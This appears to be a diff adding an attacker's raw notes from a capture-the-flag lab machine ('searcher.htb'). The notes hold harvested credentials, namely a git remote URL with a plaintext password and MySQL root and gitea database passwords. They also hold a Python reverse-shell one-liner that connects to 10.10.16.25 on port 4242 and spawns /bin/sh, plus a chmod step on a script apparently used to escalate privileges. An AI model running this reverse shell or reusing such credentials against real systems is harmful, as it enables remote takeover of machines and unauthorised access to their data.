@@ -1,0 +1,26 @@
+user.email=cody@searcher.htb
+user.name=cody
+core.hookspath=no-hooks      
+safe.directory=/var/www/app  
+core.repositoryformatversion=0
+core.filemode=true
+core.bare=false
+core.logallrefupdates=true
+remote.origin.url=http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*
+branch.main.remote=origin
+branch.main.merge=refs/heads/main
+
+"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
+      "MYSQL_USER=gitea",
+      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
+      "MYSQL_DATABASE=gitea",
+      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+      "GOSU_VERSION=1.14",
+      "MYSQL_MAJOR=8.0",
+      "MYSQL_VERSION=8.0.31-1.el8",
+      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
+      
+      import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.25",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+      
+      chmod +x full-checkup.sh
